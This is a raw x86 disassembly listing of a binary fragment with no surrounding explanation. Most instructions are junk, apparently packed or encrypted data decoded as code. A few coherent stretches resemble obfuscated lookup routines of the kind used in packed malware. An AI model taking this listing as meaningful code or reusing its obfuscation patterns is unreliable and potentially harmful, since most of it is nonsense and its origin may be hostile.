  40a857:	and    al,0x3c
  40a859:	dec    edx
  40a85a:	loope  0x40a827
  40a85c:	aad    0xb1
  40a85e:	shl    DWORD PTR [esi-0x2754bacb],0x8a
  40a865:	ss xchg ecx,eax
  40a867:	loop   0x40a826
  40a869:	in     eax,dx
  40a86a:	push   esp
  40a86b:	lahf   
  40a86c:	mov    ss,WORD PTR [ecx+eax*1-0x40f2f5be]
  40a873:	imul   esi,DWORD PTR [edi+ebx*1],0x7e
  40a877:	mov    edi,DWORD PTR [ebp+0x29f7f449]
  40a87d:	retf   0x7745
  40a880:	cmp    eax,0x88f5f898
  40a885:	add    al,0xe6
  40a887:	(bad)  
  40a888:	xor    al,0x9
  40a88a:	jns    0x40a8a7
  40a88c:	fs add eax,0xaa141d77
  40a892:	mov    edx,0xc7919a82
  40a897:	inc    ebx
  40a898:	ret    0x3bde
  40a89b:	stc    
  40a89c:	ins    DWORD PTR es:[edi],dx
  40a89d:	fistp  DWORD PTR [eax+0x9]
  40a8a0:	cmc    
  40a8a1:	int3   
  40a8a2:	cmp    al,BYTE PTR [edi-0x2f]
  40a8a5:	sbb    DWORD PTR [edi-0x707c718c],esp
  40a8ab:	lods   al,BYTE PTR ds:[esi]
  40a8ac:	std    
  40a8ad:	push   esp
  40a8ae:	frstor [ebp-0x6e]
  40a8b1:	jo     0x40a8b5
  40a8b3:	and    ecx,DWORD PTR [esi-0xb]
  40a8b6:	out    0x75,eax
  40a8b8:	fadd   st,st(7)
  40a8ba:	mov    al,0x63
  40a8bc:	xchg   edx,eax
  40a8bd:	sbb    eax,ecx
  40a8bf:	cli    
  40a8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c1:	pop    ecx
  40a8c2:	sbb    BYTE PTR [eax-0x1043f51c],ch
  40a8c8:	pop    es
  40a8c9:	jmp    0x5bf9eb13
  40a8ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8cf:	sbb    BYTE PTR [ebx],bh
  40a8d1:	nop
  40a8d2:	xchg   esp,eax
  40a8d3:	mov    edx,0xc9eafa8a
  40a8d8:	ss push ebp
  40a8da:	(bad)  
  40a8dc:	inc    eax
  40a8dd:	xor    eax,0x5e02cd61
  40a8e2:	jbe    0x40a8d6
  40a8e4:	jb     0x40a922
  40a8e6:	mov    eax,0xe5974fea
  40a8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ec:	loopne 0x40a8f6
  40a8ee:	jmp    0xbeed:0x64bab8c
  40a8f5:	fsubr  DWORD PTR [eax-0x5a]
  40a8f8:	jecxz  0x40a87c
  40a8fa:	aad    0x57
  40a8fc:	dec    esi
  40a8fd:	cmovg  esp,esp
  40a900:	cwde   
  40a901:	stc    
  40a902:	stos   BYTE PTR es:[edi],al
  40a903:	or     BYTE PTR [ecx+0x3c14db8],dl
  40a909:	adc    BYTE PTR [ecx-0x67],0xdd
  40a90d:	mov    ecx,0x8bcf2143
  40a912:	mov    BYTE PTR [esi+0x6c57b6e4],ch
  40a918:	sub    al,0x94
  40a91a:	pop    edx
  40a91b:	icebp  
  40a91c:	mov    ds:0x9c916e89,eax
  40a921:	imul   ebp,DWORD PTR ds:0x2f98303d,0xffffffe6
  40a928:	inc    edx
  40a929:	fnstcw WORD PTR cs:[ebp+0x15377495]
  40a930:	in     al,dx
  40a931:	inc    esi
  40a932:	(bad)  
  40a933:	mov    edx,0xabf0a606
  40a938:	and    BYTE PTR [eax-0x27],0x3d
  40a93c:	add    cl,ah
  40a93e:	jle    0x40a92b
  40a940:	and    ah,bh
  40a942:	ja     0x40a8de
  40a944:	icebp  
  40a945:	xor    BYTE PTR [edi+edx*1+0x7f],bh
  40a949:	loop   0x40a906
  40a94b:	(bad)  
  40a94c:	xchg   esp,eax
  40a94d:	popf   
  40a94e:	mov    al,0x1b
  40a950:	jg     0x40a8d9
  40a952:	dec    edx
  40a953:	sbb    bl,BYTE PTR [edx-0x72]
  40a956:	out    dx,al
  40a957:	mov    esp,0x9aa332d8
  40a95c:	dec    ecx
  40a95d:	nop
  40a95e:	mov    bl,0xa8
  40a960:	xsave  [ecx+0x79]
  40a964:	cli    
  40a965:	inc    esi
  40a966:	jne    0x40a900
  40a968:	call   0xc35270e0
  40a96d:	out    dx,eax
  40a96e:	mov    eax,0xacf128cd
  40a973:	outs   dx,DWORD PTR ds:[esi]
  40a974:	sbb    eax,0x3576070a
  40a979:	mov    ch,0x8e
  40a97b:	mov    bl,0x88
  40a97d:	call   0xc506:0xd9a56f28
  40a984:	inc    eax
  40a985:	out    0xd4,eax
  40a987:	inc    edi
  40a988:	inc    ebx
  40a989:	mov    cl,0x36
  40a98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98c:	inc    edx
  40a98d:	xlat   BYTE PTR ds:[ebx]
  40a98e:	adc    eax,0x8ccda988
  40a993:	fcmovu st,st(4)
  40a995:	mov    edi,0x1898d3a9
  40a99a:	cmp    BYTE PTR [eax+esi*2-0x1abced90],ch
  40a9a1:	inc    eax
  40a9a2:	mov    esi,0xdf89eace
  40a9a7:	(bad)  
  40a9a8:	out    dx,eax
  40a9a9:	xchg   esp,eax
  40a9aa:	mov    al,0x58
  40a9ac:	mov    dl,dh
  40a9ae:	sub    eax,0xd74d3647
  40a9b3:	pop    ebp
  40a9b4:	push   esi
  40a9b5:	sbb    al,0x36
  40a9b7:	ss pop es
  40a9b9:	test   BYTE PTR [ebx+0x41],dh
  40a9bc:	push   cs
  40a9bd:	pop    es
  40a9be:	sbb    BYTE PTR [edi-0x4c],ch
  40a9c1:	iret   
  40a9c2:	repnz sbb cl,ch
  40a9c5:	icebp  
  40a9c6:	sub    BYTE PTR [ebx],ah
  40a9c8:	adc    BYTE PTR [edi+0x134f860],dh
  40a9ce:	adc    BYTE PTR [eax+0x3cc4dd89],bl
  40a9d4:	mov    dh,0xf0
  40a9d6:	jp     0x40aa1c
  40a9d8:	mov    esi,0x2f9801a4
  40a9dd:	and    ah,cl
  40a9df:	mov    DWORD PTR [edi+0x3553dae3],edi
  40a9e5:	(bad)  
  40a9e6:	jno    0x40a973
  40a9e8:	sbb    DWORD PTR [esi+0x3044d6fd],0x7c
  40a9ef:	mov    dl,0x5d
  40a9f1:	xor    eax,eax
  40a9f3:	lods   eax,DWORD PTR ds:[esi]
  40a9f4:	push   ds
  40a9f5:	stos   BYTE PTR es:[edi],al
  40a9f6:	dec    esp
  40a9f7:	jne    0x40a9fe
  40a9f9:	jle    0x40aa11
  40a9fb:	adc    BYTE PTR [eax],0x90
  40a9fe:	(bad)  
  40a9ff:	mov    al,0x58
  40aa01:	sbb    dh,BYTE PTR ds:0x7d9b6381
  40aa07:	enter  0xc02f,0xeb
  40aa0b:	add    al,0xc4
  40aa0d:	sub    al,0x9f
  40aa0f:	(bad)  
  40aa10:	(bad)  
  40aa11:	and    cl,BYTE PTR [eax-0x7a]
  40aa14:	out    0x25,eax
  40aa16:	leave  
  40aa17:	call   0x2eb8c3c3
  40aa1c:	test   bl,dl
  40aa1e:	out    dx,al
  40aa1f:	cdq    
  40aa20:	mov    ah,ch
  40aa22:	push   ds
  40aa23:	dec    ebp
  40aa24:	retf   0x7eb5
  40aa27:	loope  0x40aa65
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e8e2,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x4306da,0x42e8e2
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e8da,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x4306d6,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	nop
  40aa9e:	add    eax,0xed7364fe
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aad5
  40aaaa:	inc    ebp
  40aaab:	xor    esi,eax
  40aaad:	push   esi
  40aaae:	mov    esi,0xbc064b5d
  40aab3:	push   esp
  40aab4:	pusha  
  40aab5:	mov    bh,BYTE PTR [edi+eiz*1+0x53398ee9]
  40aabc:	jmp    0xca35:0x8c4105d5
  40aac3:	scas   eax,DWORD PTR es:[edi]
  40aac4:	frstor [ecx+0x64]
  40aac7:	rcr    eax,0x48
  40aaca:	call   0xb67a34a3
  40aacf:	xchg   ecx,eax
  40aad0:	and    eax,0xaee37e8c
  40aad5:	mov    edi,0x168b59ef
  40aada:	mov    edi,0x1d40419f
  40aadf:	enter  0x6310,0x21
  40aae3:	(bad)  
  40aae4:	retf   0x7271
  40aae7:	lea    edi,[esi]
  40aae9:	popf   
  40aaea:	mov    al,0x75
  40aaec:	fwait
  40aaed:	or     al,0xa9
  40aaef:	jo     0x40aaf1
  40aaf1:	daa    
  40aaf2:	popf   
  40aaf3:	retf   0x2564
  40aaf6:	inc    esi
  40aaf7:	inc    DWORD PTR [esi-0x548999a8]
  40aafd:	push   esi
  40aafe:	mov    edx,0x9ac05ee6
  40ab03:	arpl   dx,bx
  40ab05:	xchg   edi,eax
  40ab06:	mov    ebx,0x684a19a6
  40ab0b:	adc    cl,BYTE PTR [edi+0x5c]
  40ab0e:	adc    eax,0x98dcba17
  40ab13:	and    eax,eax
  40ab15:	mov    dl,0xc2
  40ab17:	or     al,0xb0
  40ab19:	mov    eax,ds:0x94d8a28e
  40ab1e:	cmp    DWORD PTR [eax-0x18efb559],ecx
  40ab24:	call   0xd9ca:0x91d2be0e
  40ab2b:	pop    es
  40ab2c:	sbb    al,cl
  40ab2e:	jecxz  0x40ab33
  40ab30:	mov    ah,0x5
  40ab32:	adc    esp,DWORD PTR [edi]
  40ab34:	push   eax
  40ab35:	aas    
  40ab36:	mov    DWORD PTR [ebp-0x6244f02d],edx
  40ab3c:	sbb    dl,BYTE PTR [edi-0x2]
  40ab3f:	repz in eax,0x2d
  40ab42:	xor    ebp,edi
  40ab44:	and    al,0x8e
  40ab46:	cmp    al,0xc7
  40ab48:	shl    BYTE PTR [esi+0x392b0ee],cl
  40ab4e:	inc    edi
  40ab4f:	push   ss
  40ab50:	imul   ecx,DWORD PTR [eax-0x41cb1321],0x36
  40ab57:	mov    esp,DWORD PTR [ebx]
  40ab59:	xor    al,0xaf
  40ab5b:	popf   
  40ab5c:	and    ebp,eax
  40ab5e:	aad    0x99
  40ab60:	addr16 in eax,dx
  40ab62:	xchg   ecx,eax
  40ab63:	adc    DWORD PTR [edx-0xdc51bb6],esp
  40ab69:	div    esp
  40ab6b:	xchg   BYTE PTR [edi],bl
  40ab6d:	inc    esi
  40ab6e:	xor    ebx,DWORD PTR [edx]
  40ab70:	(bad)  
  40ab71:	adc    bl,ah
  40ab73:	mov    ?,ecx
  40ab75:	imul   ebp,DWORD PTR [edi],0x6a
  40ab78:	push   ds
  40ab79:	xor    DWORD PTR [esi],eax
  40ab7b:	out    dx,eax
  40ab7c:	cmc    
  40ab7d:	xchg   esi,eax
  40ab7e:	jmp    0xfcd4e0fe
  40ab83:	fadd   QWORD PTR [ecx-0x405c39b2]
  40ab89:	adc    eax,0xfd0c1752
  40ab8e:	dec    edx
  40ab8f:	cmp    DWORD PTR [ecx+0x129e741a],ecx
  40ab95:	std    
  40ab96:	loopne 0x40ab3e
  40ab98:	ret    0x4fac
  40ab9b:	scas   al,BYTE PTR es:[edi]
  40ab9c:	adc    al,ah
  40ab9e:	test   DWORD PTR [eax+0x54],eax
  40aba1:	rcr    BYTE PTR [edx+0x79],1
  40aba4:	mov    edi,0xbdfe976c
  40aba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abaa:	ins    DWORD PTR es:[edi],dx
  40abab:	test   BYTE PTR [eax+0x5c],al
  40abae:	sbb    ch,BYTE PTR [esi+0x11d51fae]
  40abb4:	repnz es lahf 
  40abb7:	inc    ebp
  40abb8:	cmp    eax,0xd2e91cf0
  40abbd:	xchg   esi,eax
  40abbe:	neg    DWORD PTR [eax+ecx*1-0x53]
  40abc2:	inc    edi
  40abc3:	lock cdq 
  40abc5:	cmp    al,0x6e
  40abc7:	jl     0x40abdc
  40abc9:	scas   al,BYTE PTR es:[edi]
  40abca:	(bad)  
  40abcb:	mov    ch,0x6a
  40abcd:	sub    al,0xe
  40abcf:	aaa    
  40abd0:	push   ebp
  40abd1:	in     eax,dx
  40abd2:	xor    esp,edx
  40abd4:	aad    0xb6
  40abd6:	jb     0x40ac15
  40abd8:	mov    ebx,0x2c197024
  40abdd:	or     BYTE PTR [edi],ah
  40abdf:	fisub  WORD PTR [eax+0x502771b2]
  40abe5:	mov    DWORD PTR [edi+0x56b3964e],eax
  40abeb:	in     al,dx
  40abec:	leave  
  40abed:	push   0x7ee8b710
  40abf2:	in     eax,0x74
  40abf4:	sub    bl,ah
  40abf6:	rcl    DWORD PTR ds:0x3f0260,1
  40abfc:	mov    ecx,0x22db59a6
  40ac01:	call   DWORD PTR [esi+esi*1+0x49f0d753]
  40ac08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac09:	xchg   edi,eax
  40ac0a:	fidiv  DWORD PTR [edi+0x4ec8a7d4]
  40ac10:	pop    ebx
  40ac11:	and    BYTE PTR [ebx-0x5a],al
  40ac14:	pop    esi
  40ac15:	sbb    BYTE PTR [esi+eiz*2+0x5b],bl
  40ac19:	cli    
  40ac1a:	int    0xf9
  40ac1c:	outs   dx,BYTE PTR ds:[esi]
  40ac1d:	fiadd  DWORD PTR [esi]
  40ac1f:	jb     0x40ac8b
  40ac21:	jo     0x40ac5e
  40ac23:	xchg   esi,eax
  40ac24:	fldcw  WORD PTR [edx]
  40ac26:	jo     0x40abef
  40ac28:	push   ax
  40ac2a:	dec    esp
  40ac2b:	pop    ss
  40ac2c:	pop    eax
  40ac2d:	fwait
  40ac2e:	or     ebx,ebp
  40ac30:	jne    0x40ac15
  40ac32:	push   es
  40ac33:	and    eax,0x23bcfabc
  40ac38:	(bad)  
  40ac39:	leave  
  40ac3a:	xor    cl,BYTE PTR [ecx+0x321295e3]
  40ac40:	pop    ebx
  40ac41:	fstp   DWORD PTR [ebx-0x2769d062]
  40ac47:	int    0x31
  40ac49:	inc    esp
  40ac4a:	jmp    0x1f24:0xcf98b798
  40ac51:	nop
  40ac52:	out    dx,al
  40ac53:	cli    
  40ac54:	xchg   DWORD PTR [ebx-0x2fadb63d],ecx
  40ac5a:	sbb    DWORD PTR [edx-0x3a],ebx
  40ac5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac5e:	cdq    
  40ac5f:	loop   0x40ac7e
  40ac61:	int    0x2b
  40ac63:	leave  
  40ac64:	and    ch,BYTE PTR [esi+0x27]
  40ac67:	push   ebx
  40ac68:	xchg   edi,eax
  40ac69:	inc    esp
  40ac6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6b:	and    eax,0x6dcba4a6
  40ac70:	mov    dl,0xd8
  40ac72:	xchg   ebp,eax
  40ac73:	push   esp
  40ac74:	imul   edx,DWORD PTR ds:0x9dbc4232,0xc
  40ac7b:	sbb    al,bl
  40ac7d:	stc    
  40ac7e:	add    edi,DWORD PTR [edx]
  40ac80:	adc    bh,BYTE PTR [ecx+0x295eed8f]
  40ac86:	jbe    0x40acbb
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xc2b2d002
  40aca1:	outs   dx,DWORD PTR ds:[esi]
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac30
  40acab:	mov    ah,0xfb
  40acad:	pop    DWORD PTR [eax-0x4c231e11]
  40acb3:	jbe    0x40acd5
  40acb5:	lods   al,BYTE PTR ds:[esi]
  40acb6:	mov    cl,0xef
  40acb8:	cdq    
  40acb9:	je     0x40acc8
  40acbb:	mov    ds:0xebfa391d,al
  40acc0:	jbe    0x40ad33
  40acc2:	mov    dl,0x85
  40acc4:	xchg   esp,eax
  40acc5:	in     al,0xd4
  40acc7:	retf   0x1ede
  40acca:	push   ds
  40accb:	push   0x2d
  40accd:	rol    dl,1
  40accf:	inc    edi
  40acd0:	les    ecx,FWORD PTR [ecx-0x2cc46c91]
  40acd6:	push   ebx
  40acd7:	push   cs
  40acd8:	pop    ebx
  40acd9:	iret   
  40acda:	mov    bh,0xee
  40acdc:	xchg   ebx,eax
  40acdd:	addr16 loope 0x40acf9
  40ace0:	and    DWORD PTR [ecx],edi
  40ace2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ace3:	adc    bl,BYTE PTR [esi-0x73]
  40ace6:	imul   ecx,DWORD PTR [ebp+0x412652bb],0xffffffbf
  40aced:	mov    bh,0x98
  40acef:	adc    DWORD PTR [ecx-0x57],ebx
  40acf2:	lahf   
  40acf3:	cmp    eax,0x75f54c0e
  40acf8:	scas   al,BYTE PTR es:[edi]
  40acf9:	cmp    al,0x18
  40acfb:	bound  esi,QWORD PTR ds:[edi+eiz*4+0x34]
  40ad00:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40ad02:	ss and eax,0xe769a8be
  40ad08:	mov    al,ds:0x67524df0
  40ad0d:	jno    0x40ace7
  40ad0f:	mov    ecx,?
  40ad11:	(bad)  
  40ad12:	ins    BYTE PTR es:[edi],dx
  40ad13:	neg    DWORD PTR ds:[edi+0xf]
  40ad17:	mov    bh,0xff
  40ad19:	mov    edi,0x9b6306fc
  40ad1e:	fnstcw WORD PTR [esi+0x5d]
  40ad21:	push   cs
  40ad22:	xchg   edx,eax
  40ad23:	les    ebx,FWORD PTR [edx]
  40ad25:	push   eax
  40ad26:	data16 mov ah,0x5c
  40ad29:	stos   BYTE PTR es:[edi],al
  40ad2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad2b:	xchg   ecx,eax
  40ad2c:	jp     0x40ad73
  40ad2e:	adc    DWORD PTR [ecx+0xb],esi
  40ad31:	dec    esp
  40ad32:	lods   al,BYTE PTR ds:[esi]
  40ad33:	je     0x40ad2e
  40ad35:	sub    eax,0x39fd0c18
  40ad3a:	(bad)  [eax-0x58]
  40ad3d:	call   ebp
  40ad3f:	or     al,0x6a
  40ad41:	cmp    DWORD PTR [ebx+0x61787d57],ecx
  40ad47:	push   eax
  40ad48:	mov    WORD PTR [edi-0x71489b3d],es
  40ad4e:	ret    
  40ad4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad50:	out    dx,al
  40ad51:	cwde   
  40ad52:	test   DWORD PTR [ebp-0x58428b51],ebp
  40ad58:	add    eax,0x807e71e5
  40ad5d:	dec    ebx
  40ad5e:	popa   
  40ad5f:	out    0x2c,al
  40ad61:	rcr    DWORD PTR [esi+0x3151f140],cl
  40ad67:	ja     0x40adb9
  40ad69:	pop    ds
  40ad6a:	enter  0x1874,0xd9
  40ad6e:	loop   0x40add6
  40ad70:	xchg   edi,eax
  40ad71:	les    ecx,FWORD PTR [edx+edx*4-0x6d]
  40ad75:	pop    ebp
  40ad76:	add    BYTE PTR [edi],0x76
  40ad79:	aas    
  40ad7a:	out    dx,eax
  40ad7b:	pop    eax
  40ad7c:	jmp    0x40addc
  40ad7e:	fdivr  QWORD PTR [eax+0x43]
  40ad81:	(bad)  
  40ad83:	rcr    BYTE PTR [eax+0x69],cl
  40ad86:	fistp  DWORD PTR cs:[esi-0x65]
  40ad8a:	mov    eax,0x29de3c1a
  40ad8f:	inc    esi
  40ad90:	inc    esi
  40ad91:	adc    ebp,DWORD PTR [ebx+0x269c5492]
  40ad97:	fsubr  DWORD PTR [esi+0x38f075d6]
  40ad9d:	fisub  DWORD PTR [ebx]
  40ad9f:	push   ebx
  40ada0:	lods   eax,DWORD PTR ds:[esi]
  40ada1:	xchg   ecx,eax
  40ada2:	lods   al,BYTE PTR ds:[esi]
  40ada3:	push   ebp
  40ada4:	push   cs
  40ada5:	mov    dh,0x7
  40ada7:	add    esp,ebx
  40ada9:	out    0x58,al
  40adab:	adc    eax,0xc6e324d9
  40adb0:	inc    BYTE PTR [edi]
  40adb2:	stos   DWORD PTR es:[edi],eax
  40adb3:	cli    
  40adb4:	arpl   WORD PTR [esi-0x30eff05a],di
  40adba:	pop    ds
  40adbb:	nop
  40adbc:	dec    edx
  40adbd:	call   0x5d81:0x3f89d8a5
  40adc4:	xchg   ebx,eax
  40adc5:	xchg   esp,eax
  40adc6:	xor    eax,0xc78f3537
  40adcb:	or     eax,0x2258214c
  40add0:	int3   
  40add1:	test   BYTE PTR [ebx],cl
  40add3:	sbb    eax,0x25120f5e
  40add8:	pop    eax
  40add9:	add    DWORD PTR [edx-0x53be1350],0x65
  40ade0:	mov    ebp,0xfb437a0b
  40ade5:	mov    WORD PTR [edi],?
  40ade7:	mov    al,ds:0x68dc9043
  40adec:	pop    esi
  40aded:	mov    ds:0xc8c7760f,al
  40adf2:	pop    ebp
  40adf3:	mov    WORD PTR [edx],fs
  40adf5:	jmp    0x22b2f20a
  40adfa:	add    DWORD PTR [edx-0x58bc7532],edi
  40ae00:	call   0xb0385e2c
  40ae05:	cs mov edx,0x278f9a32
  40ae0b:	aad    0x3a
  40ae0d:	cli    
  40ae0e:	xchg   esp,eax
  40ae0f:	sbb    eax,0x95e575d9
  40ae14:	ins    DWORD PTR es:[edi],dx
  40ae15:	pop    edx
  40ae16:	es dec ebp
  40ae18:	mov    eax,0x53350ed6
  40ae1d:	adc    edx,DWORD PTR [edi]
  40ae1f:	or     esp,esi
  40ae21:	mov    ch,BYTE PTR [esi-0x48]
  40ae24:	(bad)  
  40ae26:	sbb    cl,bh
  40ae28:	sub    al,0x3c
  40ae2a:	adc    esp,edi
  40ae2c:	xor    DWORD PTR [edx+0x38],0xffffff87
  40ae30:	xor    BYTE PTR [ecx+0x6dd253e5],al
  40ae36:	mov    al,ds:0x304600aa
  40ae3b:	xchg   edi,edx
  40ae3d:	sbb    DWORD PTR [ebx+0x20],ebx
  40ae40:	mov    al,0xd5
  40ae42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae43:	mov    DWORD PTR [ebx],esi
  40ae45:	fwait
  40ae46:	bound  esi,QWORD PTR [ebx-0x30473f2f]
  40ae4c:	stos   BYTE PTR es:[edi],al
  40ae4d:	fwait
  40ae4e:	or     eax,eax
  40ae50:	(bad)  
  40ae51:	xchg   edx,eax
  40ae52:	(bad)  
  40ae53:	and    DWORD PTR [esi-0x2d],esp
  40ae56:	pop    edi
  40ae57:	call   0x3e58:0x2cd7e3cb
  40ae5e:	adc    esp,DWORD PTR [ecx+ebx*1-0x1a7cdb66]
  40ae65:	cwde   
  40ae66:	jne    0x40adea
  40ae68:	cld    
  40ae69:	push   eax
  40ae6a:	push   es
  40ae6b:	pop    ebx
  40ae6c:	gs into 
  40ae6e:	xor    ebx,DWORD PTR [eax+ebp*4-0xe]
  40ae72:	int3   
  40ae73:	pop    ebx
  40ae74:	cdq    
  40ae75:	fldenv [ebp+0x8]
  40ae78:	retf   0x2830
  40ae7b:	mov    ds:0xb22ddb00,al
  40ae80:	push   eax
  40ae81:	pushf  
  40ae82:	pop    DWORD PTR [ebp+edx*8+0x11]
  40ae86:	test   DWORD PTR [ebx],esp
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock es xchg edi,eax
  40aeb4:	retf   0xbf32
  40aeb7:	loopne 0x40af37
  40aeb9:	jle    0x40af17
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40ae5b
  40aebf:	add    al,0xf7
  40aec1:	push   ss
  40aec2:	jmp    0x7f59f516
  40aec7:	pushf  
  40aec8:	xbegin 0x21c309fd
  40aece:	nop
  40aecf:	(bad)  
  40aed1:	outs   dx,BYTE PTR ds:[esi]
  40aed2:	mov    edi,0x3d514004
  40aed7:	div    BYTE PTR [ecx+ecx*8]
  40aeda:	inc    ebx
  40aedb:	int    0x0
  40aedd:	pop    es
  40aede:	hlt    
  40aedf:	xchg   edi,esi
  40aee1:	clc    
  40aee2:	adc    eax,0xa7a5faa3
  40aee7:	retf   
  40aee8:	mov    bl,ah
  40aeea:	xchg   ebp,eax
  40aeeb:	lock daa 
  40aeed:	adc    al,0x6f
  40aeef:	test   al,bl
  40aef1:	xchg   DWORD PTR [eax-0x1828235c],ebp
  40aef7:	or     eax,0xa5ced1a7
  40aefc:	xor    BYTE PTR [eax-0x4],ch
  40aeff:	or     BYTE PTR [eax+0x1d],al
  40af02:	sar    BYTE PTR [esi],cl
  40af04:	test   DWORD PTR [ecx-0x54],esp
  40af07:	jns    0x40af51
  40af09:	pusha  
  40af0a:	sbb    dh,BYTE PTR [esi+0x7a]
  40af0d:	push   esi
  40af0e:	pop    ds
  40af0f:	or     eax,0xc580bce0
  40af14:	pop    ds
  40af15:	cwde   
  40af16:	mov    WORD PTR [ebx-0x5f],ds
  40af19:	dec    ebp
  40af1a:	sbb    ch,ch
  40af1c:	or     DWORD PTR [edi],edx
  40af1e:	adc    al,0x2b
  40af20:	xor    al,0xe6
  40af22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af23:	add    al,0xe3
  40af25:	outs   dx,DWORD PTR ds:[esi]
  40af26:	ret    0xc530
  40af29:	push   ebx
  40af2a:	pop    edx
  40af2b:	or     al,0x67
  40af2d:	cli    
  40af2e:	dec    ecx
  40af2f:	mov    eax,ds:0x79927871
  40af34:	pop    edi
  40af35:	mov    cs,WORD PTR [esi+0x6229cd0d]
  40af3b:	add    edi,eax
  40af3d:	cwde   
  40af3e:	loope  0x40af51
  40af40:	sahf   
  40af41:	addr16 push ss
  40af43:	or     eax,0x76d8b0b0
  40af48:	inc    ecx
  40af49:	inc    ecx
  40af4a:	jnp    0x40af60
  40af4c:	pop    edi
  40af4d:	ds sub al,0x50
  40af50:	add    eax,ecx
  40af52:	mov    cl,0x93
  40af54:	dec    esp
  40af55:	scas   eax,DWORD PTR es:[edi]
  40af56:	std    
  40af57:	jl     0x40aefb
  40af59:	adc    al,0x95
  40af5b:	push   bp
  40af5d:	sbb    eax,0xa6e3e083
  40af62:	sti    
  40af63:	mov    edx,0x2e17830a
  40af68:	push   0xed5df5ad
  40af6d:	xchg   edi,eax
  40af6e:	fs paddb mm5,QWORD PTR ss:[edx+0x440c38e7]
  40af77:	(bad)  
  40af78:	fwait
  40af79:	mov    ebp,0xcd906052
  40af7e:	fwait
  40af7f:	sbb    DWORD PTR [eax],edi
  40af81:	mov    bh,0x37
  40af83:	mov    edi,0x7dba4e41
  40af88:	mov    cs,WORD PTR [esi]
  40af8a:	enter  0x96b4,0xec
  40af8e:	clc    
  40af8f:	(bad)  
  40af90:	xor    eax,0xa9f4fb7d
  40af95:	adc    DWORD PTR [edi+0x26ae29e],esp
  40af9b:	inc    eax
  40af9c:	les    edi,FWORD PTR [edx-0x8]
  40af9f:	push   edi
  40afa0:	jnp    0x40afa0
  40afa2:	xchg   edi,eax
  40afa3:	retf   
  40afa4:	xor    BYTE PTR [esi-0x58],bh
  40afa7:	mov    gs,esp
  40afa9:	fucomp st(0)
  40afab:	in     eax,dx
  40afac:	xchg   ebp,eax
  40afad:	pop    esp
  40afae:	xchg   esp,eax
  40afaf:	mov    al,0x3e
  40afb1:	pop    eax
  40afb2:	sbb    esi,DWORD PTR [ebp-0x6093dd30]
  40afb8:	lods   eax,DWORD PTR ds:[esi]
  40afb9:	cmp    al,0xa3
  40afbb:	mov    ds:0x8de524ab,al
  40afc0:	fisub  WORD PTR [esi-0x67]
  40afc3:	xchg   ebx,eax
  40afc4:	mov    WORD PTR [ecx+0x4b93a479],fs
  40afca:	inc    esp
  40afcb:	pop    edx
  40afcc:	ins    DWORD PTR es:[edi],dx
  40afcd:	mov    ebp,0xfd0ec8ad
  40afd2:	(bad)  
  40afd3:	add    BYTE PTR [esi-0xc],bl
  40afd6:	sub    DWORD PTR [ebp-0x4d],eax
